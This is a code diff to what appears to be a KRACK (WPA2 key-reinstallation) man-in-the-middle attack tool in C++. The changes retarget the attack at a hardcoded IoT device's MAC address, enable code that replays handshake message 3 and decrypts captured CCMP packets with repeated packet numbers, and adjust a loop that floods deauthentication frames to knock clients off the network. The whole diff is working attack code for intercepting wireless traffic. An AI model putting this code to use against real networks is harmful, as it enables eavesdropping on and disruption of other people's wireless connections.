@@ -50,6 +50,7 @@
 #define FIXED_CLIENT_LIST
 
 #ifdef FIXED_CLIENT_LIST
+const uint8_t *CLIENTMAC_IOT = (uint8_t*)"\xdc\x4f\x22\xf7\xfa\xbc";
 const uint8_t *CLIENTMAC_PIXEL = (uint8_t*)"\x40\x4e\x36\x8c\x4f\x85";
 const uint8_t *CLIENTMAC_SAMSUNG = (uint8_t*)"\x18\x1e\xb0\x36\x5d\x4d";
 const uint8_t *CLIENTMAC_ALFA = (uint8_t*)"\x90\x18\x7c\x6e\x6b\x20";
@@ -1076,7 +1077,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 
 	// fix network name in association request (doesn't contain channel)
 	if (opt.testmode && hdr->fc.type == TYPE_MNGMT && hdr->fc.subtype == 0) {
-		char ssid[128];
+		char ssid[32];
 		if (!beacon_get_ssid(buf, *plen, ssid, sizeof(ssid))) {
 			std::cout << "Unable to extract SSID:\n";
 			dump_packet(buf, *plen);
@@ -1123,7 +1124,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 			}
 		}
 	}
-/*
+#if 0
 	//
 	// 3. Check for Group message from AP to STA
 	//
@@ -1137,9 +1138,7 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 	// Detect & handle MIC failure. Don't forward it.
 	if (detect_mic_failure(buf, *plen, dbgout))
 		return 0;
-*/
-#if 0
-	if (client && memcmp(hdr->addr1, client->mac, 6) == 0)
+	if (client)
 	{
 		// TODO Do this in a KrackState method
 		if (client->krackstate->num_coll_pkts >= DATA_FRAMES_COLLECTION_LIMIT)
@@ -1147,10 +1146,19 @@ int analyze_traffic(wi_dev *ap, wi_dev *clone, uint8_t *buf, size_t *plen, size_
 			printf("replay msg3 rval = %d\n", client->krackstate->replay_msg3(clone));
 		}
 		int rval = client->krackstate->handle_packet(buf, *plen);
+		auto ccmp_pkt_lines = client->krackstate->ccmp_pkt_lines;
+		int cl = client->krackstate->curr_line;
+		// check for packets if packets with the same packet number exist
+		if (!ccmp_pkt_lines[cl].empty() && ccmp_pkt_lines[cl].size() == ccmp_pkt_lines[(cl - 1) % PKT_LINES].size())
+		{
+			std::cout << "Attempt decryption" << std::endl;
+			client->krackstate->decrypt_pkts();
+		}
+
 		return rval;
 	}
 #endif
-	return 1; //*plen;
+	return *plen;
 }
 
 
@@ -1509,8 +1517,9 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 	const uint8_t *clientmac;
 
 	// TODO: For now we MitM only these two clients
-	clientmac = CLIENTMAC_PIXEL;
-	client_list[MacAddr(CLIENTMAC_PIXEL)] = new ClientInfo(CLIENTMAC_PIXEL);
+	clientmac = CLIENTMAC_IOT;
+	client_list[MacAddr(CLIENTMAC_IOT)] = new ClientInfo(CLIENTMAC_IOT);
+	//client_list[MacAddr(CLIENTMAC_PIXEL)] = new ClientInfo(CLIENTMAC_PIXEL);
 	//client_list[MacAddr(CLIENTMAC_SAMSUNG)] = new ClientInfo(CLIENTMAC_SAMSUNG);
 	//client_list[MacAddr(CLIENTMAC_ALFA)] = new ClientInfo(CLIENTMAC_ALFA);
 
@@ -1553,7 +1562,7 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 			// Otherwise the firmware panics sometimes
 			std::cout << "Dirty deauth clients" << std::endl;
 			int errc = 0;
-			for (int i=0; i<0x1ff; ++i)
+			for (int i=0; i<0xff; ++i)
 			{
 				// +2Bytes for deauth reason
 				if (osal_wi_write(global.jam, buf, sizeof(ieee80211header) + 2) < 0)
@@ -1562,8 +1571,9 @@ int channelmitm(wi_dev *ap, wi_dev *clone)
 					++errc;
 					if (errc > 10)
 						break;
+					usleep(8 * 1000);
 				}
-				++hdr->sequence.seqnum; // Guessing
+				hdr->sequence.seqnum++; // Guessing
 			}
 		}
 		if (opt.jammethod == FASTREPLY)
@@ -2013,7 +2023,7 @@ int main(int argc, char *argv[])
 #else
 	// hardcoded for testing purposes
 	osal_wi_setchannel(&ap, opt.ap_channel);
-	osal_wi_setchannel(&clone, 12);
+	osal_wi_setchannel(&clone, 11);
 	if (global.jam)
 		osal_wi_setchannel(global.jam, opt.ap_channel);
 
